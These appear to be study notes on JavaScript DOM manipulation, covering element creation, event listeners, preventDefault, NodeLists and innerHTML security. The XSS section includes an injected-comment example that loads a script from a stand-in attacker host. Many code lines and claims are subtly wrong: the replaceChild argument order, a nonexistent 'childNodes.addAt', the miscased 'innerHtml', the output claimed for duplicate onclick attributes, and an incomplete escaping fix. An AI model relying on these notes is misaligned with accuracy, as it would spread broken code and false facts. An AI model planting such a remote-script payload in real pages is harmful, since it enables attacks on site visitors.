# DOM manipulation

## How can you use JavaScript to create an HTML element and then add it to your webpage?

To create an HTML elelment in JS we can use the function `Document.createElement()`

    var button = document.createElement('BUTTON');

and to create a Text in JS we use the function `Document.createTextNode()`

    var text = document.createTextNode("CLICK ME");

To append a text to an element in JS we use the function `appendChild()`

	button.appendChild(text);

To replace an element in JS

 - `target.replaceWith(newElement);` (ES5+)
 - `target.parentNode.replaceChild(target, newElement)`

## `onClick()` vs `handler`

Using `addEventListener` allows us to add unlimited events.
	
    <button id="btnTalker" onclick="say('Hi from dom\n')" onclick="say('Hi from dom,, again\n')"></button>

> `Hi from dom,, again`

	getElementById('btnTalker').addEventListener('click', function() {say('Hi from js\n')});
	getElementById('btnTalker').addEventListener('click', function() {say('Hi from js,, again\n')});

> `Hi from js`  
> `Hi from js,, again`

## How would you add a `<li>` element to the start of a `<ul>`?

	ulElement.childNodes.addAt(0, liElement);

HTML events are **things** that happen to HTML elements.  
When JavaScript is used in HTML pages, JavaScript can **react** on these events.

An HTML event can be something the browser does, or something a user does.

Some examples of HTML events:

 - An HTML web page has finished loading.
 - An HTML input field was changed.
 - An HTML button was clicked.

## What does `event.preventDefault()` do and why might you use it?

Some HTML elements has built-in actions

 - `<form>` reloads the page when `sumbit` action is fired.
 - `<a>` navigates to a link when `click` action is fired.

`event.preventDefault()` disables the built-in actions.

## What is a NodeList? How is it different from an Array?

A NodeList is a collection of document nodes.

`NodeList`s are live lists, meaning that if elements are removed or added to the DOM, the list updates automatically.

	var nodeList = document.getElementsByClassName('myClassName'); //returns a nodeList
	var arr = [];
	for(let i = 0; i<nodeList.length;i++)
		arr.push(nodeList[i]);                                     //returns an array
	nodeList[0].innerHtml = '<b>This is changes</b>';              //Changes DOM
	arr[0].innerHtml = '<b>This is changes</b>';                   //Doesn't affect DOM

## Security concerns around `Element.innerHTML`. What to use instead?

Using `innerHTML` may leed to `Cross-site scripting (XSS)`.

Consider the following input of an `innerHTML` statement is a comment in your online blog:

    let x = document.createElement('script');
    x.src = 'http://hacker-website.com/malicious-script.js';
    document.childNodes.addAt(0, src);
    alert('you are hacked');

This may lead to run harmful scripts on your device.

### How to avoid?

You can use `innerText` instead, or you can use

    content = content.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    el.innerHTML = content;
